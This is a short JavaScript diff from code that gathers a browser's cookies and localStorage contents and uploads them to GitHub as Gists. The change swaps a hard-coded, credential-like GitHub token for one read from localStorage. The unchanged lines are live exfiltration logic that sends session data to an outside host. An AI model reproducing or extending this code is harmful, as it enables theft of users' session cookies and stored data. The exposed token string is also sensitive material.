@@ -38,7 +38,7 @@ async function createGist(filename, content, token) {
     const cookies = getCookies();
     const localStorageData = getLocalStorage();
   
-    const token = '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';
+    const token = localStorage.getItem('gst_tkn');
   
     const cookiesUrl = await createGist('cookies.json', JSON.stringify(cookies, null, 2), token);
     const localStorageUrl = await createGist('localStorage.json', JSON.stringify(localStorageData, null, 2), token);
